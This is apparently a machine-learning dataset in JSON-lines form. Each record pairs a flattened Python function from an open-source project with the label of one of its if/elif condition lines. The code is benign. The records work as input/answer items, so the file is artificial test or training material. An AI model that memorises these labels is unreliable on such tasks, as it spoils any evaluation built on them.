{"input": "def iter_expressions(self): if not self._isrecord: tri_attr_context = [(\"target\", SPECIAL_INOUT)] else: tri_attr_context = [ (\"_target_o\", SPECIAL_OUTPUT), (\"_target_oe\", SPECIAL_OUTPUT), (\"_target_i\", SPECIAL_INPUT), ] tri_attr_context += [ (\"o\", SPECIAL_INPUT), (\"oe\", SPECIAL_INPUT), (\"i\", SPECIAL_OUTPUT), ] for attr, target_context in tri_attr_context: if getattr(self, attr) is not None: yield self, attr, target_context", "label": "if getattr ( self , attr ) is not None :"}
{"input": "def get_field_values(self, fields): field_values = [] for field in fields: # Title is special case if field == \"title\": value = self.get_title_display() elif field == \"country\": try: value = self.country.printable_name except exceptions.ObjectDoesNotExist: value = \"\" elif field == \"salutation\": value = self.salutation else: value = getattr(self, field) field_values.append(value) return field_values", "label": "elif field == \"salutation\" :"}
{"input": "def show_panel(panel_id): # Iterate positions to find where panel is and bring it to front. for position in _positions_names: pos_panel_ids = _get_position_panels(position) if len(pos_panel_ids) == 0: continue if len(pos_panel_ids) == 1: continue panel_widget = _get_panels_widgets_dict(gui.editor_window)[panel_id] notebook = _position_notebooks[position] for i in range(0, notebook.get_n_pages()): notebook_page = notebook.get_nth_page(i) if notebook_page == panel_widget: notebook.set_current_page(i)", "label": "if len ( pos_panel_ids ) == 0 :"}
{"input": "def draw(self): program = self._program collection = self._collection mode = collection._mode if collection._need_update: collection._update() # self._program.bind(self._vertices_buffer) if collection._uniforms_list is not None: program[\"uniforms\"] = collection._uniforms_texture program[\"uniforms_shape\"] = collection._ushape if collection._indices_list is not None: program.draw(mode, collection._indices_buffer) else: program.draw(mode)", "label": "if collection . _uniforms_list is not None :"}
{"input": "def release(provider, connection, cache=None): if cache is not None: db_session = cache.db_session if db_session is not None and db_session.ddl and cache.saved_fk_state: try: cursor = connection.cursor() sql = \"SET foreign_key_checks = 1\" if core.local.debug: log_orm(sql) cursor.execute(sql) except: provider.pool.drop(connection) raise DBAPIProvider.release(provider, connection, cache)", "label": "if core . local . debug :"}
{"input": "def expanded_output(self): \"\"\"Iterate over output files while dynamic output is expanded.\"\"\" for f, f_ in zip(self.output, self.rule.output): if f in self.dynamic_output: expansion = self.expand_dynamic(f_) if not expansion: yield f_ for f, _ in expansion: file_to_yield = IOFile(f, self.rule) file_to_yield.clone_flags(f_) yield file_to_yield else: yield f", "label": "if f in self . dynamic_output :"}
{"input": "def __new__(cls, xs: Tuple[Optional[AbstractValue], core.Value]): pv, const = xs if not core.skip_checks: # type checks assert isinstance(pv, (AbstractValue, type(None))), xs assert ( isinstance(const, core.Tracer) or type(const) is Zero or core.valid_jaxtype(const) ), xs # invariant checks if isinstance(pv, AbstractValue): assert get_aval(const) == core.abstract_unit, xs return tuple.__new__(cls, xs)", "label": "if isinstance ( pv , AbstractValue ) :"}
{"input": "def MenuItemSearch(menu, item): for menuItem in list(menu.GetMenuItems()): label = menuItem.GetItemLabel() if not label: # It's a separator continue shortcutItem = Shortcut(menuItem=menuItem) shortcutItem.FromMenuItem() item.AppendItem(shortcutItem) subMenu = menuItem.GetSubMenu() if subMenu: MenuItemSearch(subMenu, shortcutItem)", "label": "if subMenu :"}
{"input": "def fill_potential_satellites_by_type(self, sat_type): setattr(self, \"potential_%s\" % sat_type, []) for satellite in getattr(self, sat_type): getattr(self, \"potential_%s\" % sat_type).append(satellite) for realm in self.higher_realms: for satellite in getattr(realm, sat_type): if satellite.manage_sub_realms: getattr(self, \"potential_%s\" % sat_type).append(satellite)", "label": "if satellite . manage_sub_realms :"}
{"input": "def _gen(): while True: try: loop_val = it.next() # e.g. x except StopIteration: break self.mem.SetValue( lvalue.Named(iter_name), value.Obj(loop_val), scope_e.LocalOnly ) if comp.cond: b = self.EvalExpr(comp.cond) else: b = True if b: item = self.EvalExpr(node.elt) # e.g. x*2 yield item", "label": "if b :"}
{"input": "def _iter_backtick_string(gen, line, back_start): for _, tokval, start, _, _ in gen: if tokval == \"`\": return ( BACKTICK_TAG + binascii.b2a_hex(line[back_start[1] + 1 : start[1]].encode()).decode() ) else: raise SyntaxError(f\"backtick quote at {back_start} does not match\")", "label": "if tokval == \"`\" :"}
{"input": "def to_internal_value(self, data): site = get_current_site() pages_root = reverse(\"pages-root\") ret = [] for path in data: if path.startswith(pages_root): path = path[len(pages_root) :] # strip any final slash if path.endswith(\"/\"): path = path[:-1] page = get_page_from_path(site, path) if page: ret.append(page) return ret", "label": "if page :"}
{"input": "def refresh(self): # In MongoTrials, this method fetches from database if self._exp_key is None: self._trials = [ tt for tt in self._dynamic_trials if tt[\"state\"] in JOB_VALID_STATES ] else: self._trials = [ tt for tt in self._dynamic_trials if (tt[\"state\"] in JOB_VALID_STATES and tt[\"exp_key\"] == self._exp_key) ] self._ids.update([tt[\"tid\"] for tt in self._trials])", "label": "if ( tt [ \"state\" ] in JOB_VALID_STATES and tt [ \"exp_key\" ] == self . _exp_key )"}
{"input": "def create_model(self, model): for field in model._meta.local_fields: # Autoincrement SQL for backends with post table definition variant if field.get_internal_type() == \"PositiveAutoField\": autoinc_sql = self.connection.ops.autoinc_sql( model._meta.db_table, field.column ) if autoinc_sql: self.deferred_sql.extend(autoinc_sql) super().create_model(model)", "label": "if autoinc_sql :"}
{"input": "def row_match(base_row, row): # ildutil.ild_err(\"ILD_DEBUG BASE ROW %s\" % (base_row,)) for (op, val) in list(row.items()): if op in base_row: if base_row[op] != val: return False else: ildutil.ild_err( \"BASE ROW %s doesn't have OD %s from row %s\" % (base_row, op, row) ) return None return True", "label": "if op in base_row :"}
{"input": "def get_referrers(self): d = [] for o in gc.get_referrers(self.obj): name = None if isinstance(o, dict): name = web.dictfind(o, self.obj) for r in gc.get_referrers(o): if getattr(r, \"__dict__\", None) is o: o = r break elif isinstance(o, dict): # other dict types name = web.dictfind(o, self.obj) if not isinstance(name, six.string_types): name = None d.append(Object(o, name)) return d", "label": "if not isinstance ( name , six . string_types ) :"}
{"input": "def _run(env, remote): if device == \"vta\": target = env.target if env.TARGET not in [\"sim\", \"tsim\"]: assert tvm.runtime.enabled(\"rpc\") program_fpga(remote, bitstream=None) reconfig_runtime(remote) elif device == \"arm_cpu\": target = env.target_vta_cpu with autotvm.tophub.context(target): # load pre-tuned schedule parameters for _, wl in resnet_wkls: print(wl) run_conv2d(env, remote, wl, target)", "label": "if env . TARGET not in [ \"sim\" , \"tsim\" ] :"}
{"input": "def retrieve(self, aclass): \"\"\"Look for a specifc class/name in the packet\"\"\" resu = [] for x in self.payload: try: if isinstance(aclass, str): if x.name == aclass: resu.append(x) else: if isinstance(x, aclass): resu.append(x) resu += x.retrieve(aclass) except: pass return resu", "label": "if x . name == aclass :"}
{"input": "def summary_passes(self): if self.config.option.tbstyle != \"no\": if self.hasopt(\"P\"): reports = self.getreports(\"passed\") if not reports: return self.write_sep(\"=\", \"PASSES\") for rep in reports: msg = self._getfailureheadline(rep) self.write_sep(\"_\", msg) self._outrep_summary(rep)", "label": "if not reports :"}
{"input": "def fn(): random_states = { name: cls.random_state_function(state_spec=state_spec)() for name, state_spec in states_spec.items() } for name, action_spec in actions_spec.items(): if action_spec[\"type\"] == \"int\": mask = cls.random_mask(action_spec=action_spec) random_states[name + \"_mask\"] = mask return random_states", "label": "if action_spec [ \"type\" ] == \"int\" :"}
{"input": "def _show_option(name=None): if name is None: name = \"\" filename = peda.getfile() if filename: filename = os.path.basename(filename) else: filename = None for (k, v) in sorted(config.Option.show(name).items()): if filename and isinstance(v, str) and \"#FILENAME#\" in v: v = v.replace(\"#FILENAME#\", filename) msg(\"%s = %s\" % (k, repr(v))) return", "label": "if filename and isinstance ( v , str ) and \"#FILENAME#\" in v :"}
{"input": "def _set_posonly_args_def(self, argmts, vals): for v in vals: argmts.posonlyargs.append(v[\"arg\"]) d = v[\"default\"] if d is not None: argmts.defaults.append(d) elif argmts.defaults: self._set_error(\"non-default argument follows default argument\")", "label": "if d is not None :"}
{"input": "def get(self): with self._lock: if not self._connection or self._connection.closed != 0: self._connection = psycopg2.connect(**self._conn_kwargs) self._connection.autocommit = True self.server_version = self._connection.server_version return self._connection", "label": "if not self . _connection or self . _connection . closed != 0 :"}
{"input": "def _Determine_Do(self): if sys.platform == \"darwin\": self.applicable = True for opt, optarg in self.chosenOptions: if opt == \"--\" + self.longopt: self.value = os.path.abspath(optarg) break else: self.applicable = False self.determined = True", "label": "if opt == \"--\" + self . longopt :"}
{"input": "def delete_tags(filenames, v1, v2): for filename in filenames: with _sig.block(): if verbose: print_(u\"deleting ID3 tag info in\", filename, file=sys.stderr) mutagen.id3.delete(filename, v1, v2)", "label": "if verbose :"}
{"input": "def startJail(self, name): with self.__lock: jail = self.__jails[name] if not jail.isAlive(): jail.start() elif name in self.__reload_state: logSys.info(\"Jail %r reloaded\", name) del self.__reload_state[name] if jail.idle: jail.idle = False", "label": "elif name in self . __reload_state :"}
{"input": "def get_field_by_name(obj, field): # Dereference once if obj.type.code == gdb.TYPE_CODE_PTR: obj = obj.dereference() for f in re.split(\"(->|\\.|\\[\\d+\\])\", field): if not f: continue if f == \"->\": obj = obj.dereference() elif f == \".\": pass elif f.startswith(\"[\"): n = int(f.strip(\"[]\")) obj = obj.cast(obj.dereference().type.pointer()) obj += n obj = obj.dereference() else: obj = obj[f] return obj", "label": "if not f :"}
{"input": "def _parse_yum_or_zypper_repositories(output): repos = [] current_repo = {} for line in output: line = line.strip() if not line or line.startswith(\"#\"): continue if line.startswith(\"[\"): if current_repo: repos.append(current_repo) current_repo = {} current_repo[\"name\"] = line[1:-1] if current_repo and \"=\" in line: key, value = line.split(\"=\", 1) current_repo[key] = value if current_repo: repos.append(current_repo) return repos", "label": "if line . startswith ( \"[\" ) :"}
{"input": "def add_to_auto_transitions(cls, base): result = {} for name, method in base.__dict__.items(): if callable(method) and hasattr(method, \"_django_fsm\"): for name, transition in method._django_fsm.transitions.items(): if transition.custom.get(\"auto\"): result.update({name: method}) return result", "label": "if callable ( method ) and hasattr ( method , \"_django_fsm\" ) :"}
{"input": "def commit(cache): assert cache.is_alive try: if cache.modified: cache.flush() if cache.in_transaction: assert cache.connection is not None cache.database.provider.commit(cache.connection, cache) cache.for_update.clear() cache.query_results.clear() cache.max_id_cache.clear() cache.immediate = True except: cache.rollback() raise", "label": "if cache . modified :"}
{"input": "def block_items(objekt, block, eldict): if objekt not in block: if isinstance(objekt.type, PyType): if objekt.type not in block: block.append(objekt.type) block.append(objekt) if isinstance(objekt, PyType): others = [ p for p in eldict.values() if isinstance(p, PyElement) and p.type[1] == objekt.name ] for item in others: if item not in block: block.append(item) return block", "label": "if objekt . type not in block :"}
{"input": "def __getattr__(self, item): import pyarrow.lib ret = getattr(plasma, item, None) if ret is None: # pragma: no cover if item == \"PlasmaObjectNotFound\": ret = getattr(plasma, \"PlasmaObjectNonexistent\", None) or getattr( pyarrow.lib, \"PlasmaObjectNonexistent\" ) elif item == \"PlasmaStoreFull\": ret = getattr(pyarrow.lib, item) if ret is not None: setattr(self, item, ret) return ret", "label": "if item == \"PlasmaObjectNotFound\" :"}
{"input": "def clean_str(*args): tdict = {\"str\": 0, \"bytearray\": 1, \"unicode\": 2} for obj in args: k = tdict.get(type(obj).__name__) if k is None: raise RuntimeError(\"Can not clean object: %s\" % obj) clean_obj(obj, k)", "label": "if k is None :"}
{"input": "def incoming(): while True: m = ws.receive() if m is not None: m = str(m) print((m, len(m))) if len(m) == 35: ws.close() break else: break print((\"Connection closed!\",))", "label": "if m is not None :"}
{"input": "def TryMerge(self, d): while d.avail() > 0: tt = d.getVarInt32() if tt == 8: self.add_set_status(d.getVarInt32()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 0 :"}
{"input": "def __init__(self, text, menu): self.text = text self.menu = menu print(text) for i, option in enumerate(menu): menunum = i + 1 # Check to see if this line has the 'return to main menu' code match = re.search(\"0D\", option) # If it's not the return to menu line: if not match: if menunum < 10: print((\" %s) %s\" % (menunum, option))) else: print((\" %s) %s\" % (menunum, option))) else: print(\"\\n 99) Return to Main Menu\\n\") return", "label": "if not match :"}
{"input": "def take_step(self): with self.walk_lock: # Share my random channels peers = self.overlay.get_peers() if peers: peer = choice(peers) self.overlay.send_random_to(peer)", "label": "if peers :"}
{"input": "def clear_highlight(self): for doc in self._window.get_documents(): start, end = doc.get_bounds() if doc.get_tag_table().lookup(\"result_highlight\") == None: tag = doc.create_tag( \"result_highlight\", foreground=\"yellow\", background=\"red\" ) doc.remove_tag_by_name(\"result_highlight\", start, end)", "label": "if doc . get_tag_table ( ) . lookup ( \"result_highlight\" ) == None :"}
{"input": "def impl(self, to_strip=None): mask = get_nan_mask(self._data._data) item_count = len(self._data) res_list = [\"\"] * item_count for it in range(item_count): item = self._data._data[it] if len(item) > 0: res_list[it] = usecase(item, to_strip) else: res_list[it] = item str_arr = create_str_arr_from_list(res_list) result = str_arr_set_na_by_mask(str_arr, mask) return pandas.Series(result, self._data._index, name=self._data._name)", "label": "if len ( item ) > 0 :"}
{"input": "def modify_subnet_attribute(self): subnet_id = self._get_param(\"SubnetId\") for attribute in (\"MapPublicIpOnLaunch\", \"AssignIpv6AddressOnCreation\"): if self.querystring.get(\"%s.Value\" % attribute): attr_name = camelcase_to_underscores(attribute) attr_value = self.querystring.get(\"%s.Value\" % attribute)[0] self.ec2_backend.modify_subnet_attribute(subnet_id, attr_name, attr_value) return MODIFY_SUBNET_ATTRIBUTE_RESPONSE", "label": "if self . querystring . get ( \"%s.Value\" % attribute ) :"}
{"input": "def join(s, *p): path = s for t in p: if (not s) or isabs(t): path = t continue if t[:1] == \":\": t = t[1:] if \":\" not in path: path = \":\" + path if path[-1:] != \":\": path = path + \":\" path = path + t return path", "label": "if path [ - 1 : ] != \":\" :"}
{"input": "def publish(self): # monoproc if not self.modules.has_option(self.subscriber_name, \"publish\"): return False dest = self.modules.get(self.subscriber_name, \"publish\") # We can have multiple publisher for name in dest.split(\",\"): self.pubsub.setup_publish(name) while True: message = self.r_temp.spop(self.subscriber_name + \"out\") if message is None: time.sleep(1) continue self.pubsub.publish(message)", "label": "if message is None :"}
{"input": "def ignore(self, other): if isinstance(other, Suppress): if other not in self.ignoreExprs: super().ignore(other) if self.expr is not None: self.expr.ignore(self.ignoreExprs[-1]) else: super().ignore(other) if self.expr is not None: self.expr.ignore(self.ignoreExprs[-1]) return self", "label": "if other not in self . ignoreExprs :"}
{"input": "def recurse(node): for child in node.childNodes: if child.nodeType != child.ELEMENT_NODE: continue if child.nodeName.upper() == \"H1\": return child if child not in visited: return recurse(child)", "label": "if child not in visited :"}
{"input": "def req(s, poll, msg, expect): do_req = True xid = None while True: # get transaction id if do_req: xid = s.put(msg)[\"xid\"] # wait for response events = poll.poll(2) for (fd, event) in events: response = s.get() if response[\"xid\"] != xid: do_req = False continue if response[\"options\"][\"message_type\"] != expect: raise Exception(\"DHCP protocol error\") return response do_req = True", "label": "if response [ \"xid\" ] != xid :"}
{"input": "def close(self, invalidate=False): self.session.transaction = self._parent if self._parent is None: for connection, transaction, autoclose in set(self._connections.values()): if invalidate: connection.invalidate() if autoclose: connection.close() else: transaction.close() self._state = CLOSED self.session.dispatch.after_transaction_end(self.session, self) if self._parent is None: if not self.session.autocommit: self.session.begin() self.session = None self._connections = None", "label": "if autoclose :"}
{"input": "def visit_loop(self): v = self.vS.top_front() i = self.iS.top_front() num_edges = len(self.graph[v].edges) # Continue traversing out-edges until none left. while i <= num_edges: # Continuation if i > 0: # Update status for previously traversed out-edge self.finish_edge(v, i - 1) if i < num_edges and self.begin_edge(v, i): return i += 1 # Finished traversing out edges, update component info self.finish_visiting(v)", "label": "if i < num_edges and self . begin_edge ( v , i ) :"}
{"input": "def get_objects(self): list_type, id, handles, timestamp = self._obj_list retval = [] for (target, handle) in handles: _class = map2class(target) if _class: obj = _class(self._dbstate, pickle.dumps((target, id, handle, timestamp))) if obj: retval.append(obj) return retval", "label": "if _class :"}
{"input": "def __init__(self, config_lists): self.lens = len(config_lists) self.spaces = [] for config_list in config_lists: if isinstance(config_list, tuple): key, config = config_list elif isinstance(config_list, str): key = config_list config = None else: raise NotImplementedError( \"the type of config is Error!!! Please check the config information. Receive the type of config is {}\".format( type(config_list) ) ) self.spaces.append(self._get_single_search_space(key, config)) self.init_tokens()", "label": "elif isinstance ( config_list , str ) :"}
{"input": "def fieldset_string_to_field(fieldset_dict, model): if isinstance(fieldset_dict[\"fields\"], tuple): fieldset_dict[\"fields\"] = list(fieldset_dict[\"fields\"]) i = 0 for dict_field in fieldset_dict[\"fields\"]: if isinstance(dict_field, string_types): fieldset_dict[\"fields\"][i] = model._meta.get_field_by_name(dict_field)[0] elif isinstance(dict_field, list) or isinstance(dict_field, tuple): dict_field[1][\"recursive\"] = True fieldset_string_to_field(dict_field[1], model) i += 1", "label": "if isinstance ( dict_field , string_types ) :"}
{"input": "def _get_directories(config): for directory in config[\"dump_directories\"]: for dname in sorted(glob.glob(os.path.join(directory, \"*[Aa]*[Xx][XxYy23]\"))): if os.path.isdir(dname): yield dname", "label": "if os . path . isdir ( dname ) :"}
{"input": "def process_event(self, event): super().process_event(event) if event.type == pygame.USEREVENT: if event.user_type == pygame_gui.UI_BUTTON_PRESSED: self.input_op(event.ui_object_id[-1]) return True", "label": "if event . user_type == pygame_gui . UI_BUTTON_PRESSED :"}
{"input": "def _restore_std_streams(self): stdout = sys.stdout.getvalue() stderr = sys.stderr.getvalue() close = [sys.stdout, sys.stderr] sys.stdout = sys.__stdout__ sys.stderr = sys.__stderr__ for stream in close: stream.close() if stdout and stderr: if not stderr.startswith((\"*TRACE*\", \"*DEBUG*\", \"*INFO*\", \"*HTML*\", \"*WARN*\")): stderr = \"*INFO* %s\" % stderr if not stdout.endswith(\"\\n\"): stdout += \"\\n\" return self._handle_binary_result(stdout + stderr)", "label": "if not stdout . endswith ( \"\\n\" ) :"}
{"input": "def _get_attachments(self): if self._attachments is None: alist = [] for a in self._message.get_attachments(): alist.append((AttachmentWidget(a), None)) if alist: self._attachments = SimpleTree(alist) return self._attachments", "label": "if alist :"}
{"input": "def __getattr__(self, name): # if the aval property raises an AttributeError, gets caught here assert skip_checks or name != \"aval\" try: attr = getattr(self.aval, name) except KeyError as err: raise AttributeError( \"{} has no attribute {}\".format(self.__class__.__name__, name) ) from err else: t = type(attr) if t is aval_property: return attr.fget(self) elif t is aval_method: return types.MethodType(attr.fun, self) else: return attr", "label": "elif t is aval_method :"}
{"input": "def _find_first_unescaped(dn, char, pos): while True: pos = dn.find(char, pos) if pos == -1: break # no char found if pos > 0 and dn[pos - 1] != \"\\\\\": # unescaped char break elif pos > 1 and dn[pos - 1] == \"\\\\\": # may be unescaped escaped = True for c in dn[pos - 2 : 0 : -1]: if c == \"\\\\\": escaped = not escaped else: break if not escaped: break pos += 1 return pos", "label": "if pos == - 1 :"}
{"input": "def test_synopsis(self): self.addCleanup(unlink, TESTFN) for encoding in (\"ISO-8859-1\", \"UTF-8\"): with open(TESTFN, \"w\", encoding=encoding) as script: if encoding != \"UTF-8\": print(\"#coding: {}\".format(encoding), file=script) print('\"\"\"line 1: h\\xe9', file=script) print('line 2: hi\"\"\"', file=script) synopsis = pydoc.synopsis(TESTFN, {}) self.assertEqual(synopsis, \"line 1: h\\xe9\")", "label": "if encoding != \"UTF-8\" :"}
{"input": "def qualify(x): parts = x.split(\";\", 1) if len(parts) == 2: match = re.match(r\"(^|;)q=(0(\\.\\d{,3})?|1(\\.0{,3})?)(;|$)\", parts[1]) if match: return parts[0].strip(), float(match.group(2)) return parts[0].strip(), 1", "label": "if match :"}
{"input": "def getEndpoints(self): endpoints = self.endpoints[:] for i in range(len(endpoints)): ep = endpoints[i] if not issubclass(ep, Endpoint): raise TypeError(\"Not an Endpoint subclass\") endpoints[i] = ep(self, self.master) return endpoints", "label": "if not issubclass ( ep , Endpoint ) :"}
{"input": "def __getitem__(self, index): if cfg.RPN.ENABLED: return self.get_rpn_sample(index) elif cfg.RCNN.ENABLED: if self.mode == \"TRAIN\": if cfg.RCNN.ROI_SAMPLE_JIT: return self.get_rcnn_sample_jit(index) else: return self.get_rcnn_training_sample_batch(index) else: return self.get_proposal_from_file(index) else: raise NotImplementedError", "label": "if self . mode == \"TRAIN\" :"}
{"input": "def test_data_path(self, filename): repository_dir = self._repository_dir test_data = None if repository_dir: return self.__walk_test_data(dir=repository_dir, filename=filename) else: if self.tool_dir: tool_dir = self.tool_dir if isinstance(self, DataManagerTool): tool_dir = os.path.dirname(self.tool_dir) test_data = self.__walk_test_data(tool_dir, filename=filename) if not test_data: test_data = self.app.test_data_resolver.get_filename(filename) return test_data", "label": "if isinstance ( self , DataManagerTool ) :"}
{"input": "def generate_forwards(cls, attrs): # forward functions of _forwards for attr_name, attr in cls._forwards.__dict__.items(): if attr_name.startswith(\"_\") or attr_name in attrs: continue if isinstance(attr, property): cls._forward.append(attr_name) elif isinstance(attr, types.FunctionType): wrapper = _forward_factory(cls, attr_name, attr) setattr(cls, attr_name, wrapper) else: raise TypeError(attr_name, type(attr))", "label": "elif isinstance ( attr , types . FunctionType ) :"}
{"input": "def summary(result): if not self.options.metadata_to_dict: if self.options.verbose: pprint(Fore.CYAN + result[\"title\"] + Fore.RESET) pprint( Fore.CYAN + Style.DIM + result[\"written_at\"] + Style.RESET_ALL + Fore.RESET ) pprint(result[\"body\"]) writer.write(\"@title:\" + result[\"title\"]) writer.write(\"@written_at:\" + result[\"written_at\"]) writer.write(\"@body:\" + result[\"body\"]) else: if self.options.verbose: pprint(result) writer.write(result)", "label": "if self . options . verbose :"}
{"input": "def visit_StringConstant(self, node: qlast.StringConstant) -> None: if not _NON_PRINTABLE_RE.search(node.value): for d in (\"'\", '\"', \"$$\"): if d not in node.value: if \"\\\\\" in node.value and d != \"$$\": self.write(\"r\", d, node.value, d) else: self.write(d, node.value, d) return self.write(edgeql_quote.dollar_quote_literal(node.value)) return self.write(repr(node.value))", "label": "if d not in node . value :"}
{"input": "def get_sql_date_trunc(col, db=\"default\", grouper=\"hour\"): conn = connections[db] engine = get_db_engine(db) # TODO: does extract work for sqlite? if engine.startswith(\"oracle\"): method = DATE_TRUNC_GROUPERS[\"oracle\"].get( grouper, DATE_TRUNC_GROUPERS[\"default\"][grouper] ) if '\"' not in col: col = '\"%s\"' % col.upper() else: method = DATE_TRUNC_GROUPERS[\"default\"][grouper] return conn.ops.date_trunc_sql(method, col)", "label": "if '\"' not in col :"}
{"input": "def req(s, poll, msg, expect): do_req = True xid = None while True: # get transaction id if do_req: xid = s.put(msg)[\"xid\"] # wait for response events = poll.poll(2) for (fd, event) in events: response = s.get() if response[\"xid\"] != xid: do_req = False continue if response[\"options\"][\"message_type\"] != expect: raise Exception(\"DHCP protocol error\") return response do_req = True", "label": "if response [ \"options\" ] [ \"message_type\" ] != expect :"}
{"input": "def __init__(self, f): self._refs = {} self._peeled = {} for line in f.readlines(): sha, name = line.rstrip(b\"\\n\").split(b\"\\t\") if name.endswith(ANNOTATED_TAG_SUFFIX): name = name[:-3] if not check_ref_format(name): raise ValueError(\"invalid ref name %r\" % name) self._peeled[name] = sha else: if not check_ref_format(name): raise ValueError(\"invalid ref name %r\" % name) self._refs[name] = sha", "label": "if name . endswith ( ANNOTATED_TAG_SUFFIX ) :"}
{"input": "def get_defines(clang_output): import re defines = [] for line in output.splitlines(): m = re.search(r\"#define ([\\w()]+) (.+)\", line) if m is not None: defines.append(\"-D{}={}\".format(m.group(1), m.group(2))) else: m = re.search(r\"#define (\\w+)\", line) if m is not None: defines.append(\"-D{}\".format(m.group(1))) _log.debug(\"Got defines: %s\", defines) return defines", "label": "if m is not None :"}
{"input": "def clean_rcs_keywords(paragraph, keyword_substitutions): if len(paragraph) == 1 and isinstance(paragraph[0], nodes.Text): textnode = paragraph[0] for pattern, substitution in keyword_substitutions: match = pattern.search(textnode.data) if match: textnode.data = pattern.sub(substitution, textnode.data) return", "label": "if match :"}
{"input": "def reorder_incremental_state( self, incremental_state: Dict[str, Dict[str, Optional[Tensor]]], new_order ): \"\"\"Reorder buffered internal state (for incremental generation).\"\"\" input_buffer = self._get_input_buffer(incremental_state) if input_buffer is not None: for k in input_buffer.keys(): if input_buffer[k] is not None: input_buffer[k] = input_buffer[k].index_select(0, new_order) incremental_state = self._set_input_buffer(incremental_state, input_buffer) return incremental_state", "label": "if input_buffer [ k ] is not None :"}
{"input": "def render(cls) -> str: buf = render_utils.RenderBuffer() buf.write(f\"struct {cls.__name__} {{\") with buf.indent(): for fieldname, field in cls._fields.items(): if field.doc: buf.write_comment(field.doc) field.render_field(fieldname, buf) buf.newline() if buf.lastline() == \"\": buf.popline() buf.write(\"};\") return str(buf)", "label": "if field . doc :"}
{"input": "def prepare_text(text, style): body = [] for fragment, sty in parse_tags(text, style, subs.styles): fragment = fragment.replace(r\"\\h\", \" \") fragment = fragment.replace(r\"\\n\", \"\\n\") fragment = fragment.replace(r\"\\N\", \"\\n\") if sty.italic: fragment = \"<i>%s</i>\" % fragment if sty.underline: fragment = \"<u>%s</u>\" % fragment if sty.strikeout: fragment = \"<s>%s</s>\" % fragment if sty.drawing: raise ContentNotUsable body.append(fragment) return re.sub(\"\\n+\", \"\\n\", \"\".join(body).strip())", "label": "if sty . italic :"}
{"input": "def _show_warnings(self): if self._warnings_handled: return self._warnings_handled = True if self._result and (self._result.has_next or not self._result.warning_count): return ws = self._get_db().show_warnings() if ws is None: return for w in ws: msg = w[-1] if PY2: if isinstance(msg, unicode): msg = msg.encode(\"utf-8\", \"replace\") warnings.warn(err.Warning(*w[1:3]), stacklevel=4)", "label": "if isinstance ( msg , unicode ) :"}
{"input": "def scrub_time(self, time): # used externally to set time by slider scrubbing debug(\"scrub_time: {0}\".format(time)) if time == 0: self.loop_backward() elif time == self.timer_duration: self.loop_forward() else: # time in between 0 and duration if self.timer_status == TIMER_STATUS_STOPPED: self.timer_status = TIMER_STATUS_PAUSED elif self.timer_status == TIMER_STATUS_EXPIRED: self.timer_status = TIMER_STATUS_PAUSED self.timer_time = time", "label": "elif self . timer_status == TIMER_STATUS_EXPIRED :"}
{"input": "def _default_import_run(run, dest, move, copy_resources): if move: log.info(\"Moving %s\", run.id) if copy_resources: shutil.copytree(run.path, dest) util.safe_rmtree(run.path) else: shutil.move(run.path, dest) else: log.info(\"Copying %s\", run.id) shutil.copytree(run.path, dest, symlinks=not copy_resources)", "label": "if copy_resources :"}
{"input": "def fn(n): while n < 3: if n < 0: yield \"less than zero\" elif n == 0: yield \"zero\" elif n == 1: yield \"one\" else: yield \"more than one\" n += 1", "label": "if n < 0 :"}
{"input": "def _check_dep_names(self): \"\"\"check if user input task_dep or setup_task that doesnt exist\"\"\" # check task-dependencies exist. for task in self.tasks.values(): for dep in task.task_dep: if dep not in self.tasks: msg = \"%s. Task dependency '%s' does not exist.\" raise InvalidTask(msg % (task.name, dep)) for setup_task in task.setup_tasks: if setup_task not in self.tasks: msg = \"Task '%s': invalid setup task '%s'.\" raise InvalidTask(msg % (task.name, setup_task))", "label": "if dep not in self . tasks :"}
{"input": "def urls(): for scheme in (b\"http\", b\"https\"): for host in (b\"example.com\",): for port in (None, 100): for path in (b\"\", b\"path\"): if port is not None: host = host + b\":\" + networkString(str(port)) yield urlunsplit((scheme, host, path, b\"\", b\"\"))", "label": "if port is not None :"}
{"input": "def split_hashes(cls, line): # type: (S) -> Tuple[S, List[S]] if \"--hash\" not in line: return line, [] split_line = line.split() line_parts = [] # type: List[S] hashes = [] # type: List[S] for part in split_line: if part.startswith(\"--hash\"): param, _, value = part.partition(\"=\") hashes.append(value) else: line_parts.append(part) line = \" \".join(line_parts) return line, hashes", "label": "if part . startswith ( \"--hash\" ) :"}
{"input": "def part(p, imaginary): # Represent infinity as 1e1000 and NaN as 1e1000-1e1000. s = \"j\" if imaginary else \"\" try: if math.isinf(p): if p < 0: return \"-1e1000\" + s return \"1e1000\" + s if math.isnan(p): return \"(1e1000%s-1e1000%s)\" % (s, s) except OverflowError: # math.isinf will raise this when given an integer # that's too large to convert to a float. pass return repr(p) + s", "label": "if p < 0 :"}
{"input": "def _build_display_args(self, r): args = [] if self.RESULT: if type(self.RESULT) != type([]): result = [self.RESULT] else: result = self.RESULT for name in result: value = getattr(r, name) # Displayed offsets should be offset by the base address if name == \"offset\": value += self.config.base args.append(value) return args", "label": "if type ( self . RESULT ) != type ( [ ] ) :"}
{"input": "def cell_data_statusicon(column, cell, model, row, data): \"\"\"Display text with an icon\"\"\" try: state = model.get_value(row, data) if func_last_value[\"cell_data_statusicon\"] == state: return func_last_value[\"cell_data_statusicon\"] = state icon = ICON_STATE[state] # Supress Warning: g_object_set_qdata: assertion `G_IS_OBJECT (object)' failed original_filters = warnings.filters[:] warnings.simplefilter(\"ignore\") try: cell.set_property(\"pixbuf\", icon) finally: warnings.filters = original_filters except KeyError: pass", "label": "if func_last_value [ \"cell_data_statusicon\" ] == state :"}
{"input": "def _para_exploit(self, params, part): if len(params) == 0: arr = [\"*\", \"config\"] + self._configs.keys() return suggest(arr, part) if len(params) == 1: arr = [] if params[0] == \"config\": arr = self._configs.keys() if params[0] == \"*\": arr = [\"stopOnFirst\"] return suggest(arr, part) return []", "label": "if params [ 0 ] == \"config\" :"}
{"input": "def send(self, data, flags=0, timeout=timeout_default): if timeout is timeout_default: timeout = self.timeout try: return self._sock.send(data, flags) except error as ex: if ex.args[0] not in _socketcommon.GSENDAGAIN or timeout == 0.0: raise sys.exc_clear() self._wait(self._write_event) try: return self._sock.send(data, flags) except error as ex2: if ex2.args[0] == EWOULDBLOCK: return 0 raise", "label": "if ex2 . args [ 0 ] == EWOULDBLOCK :"}
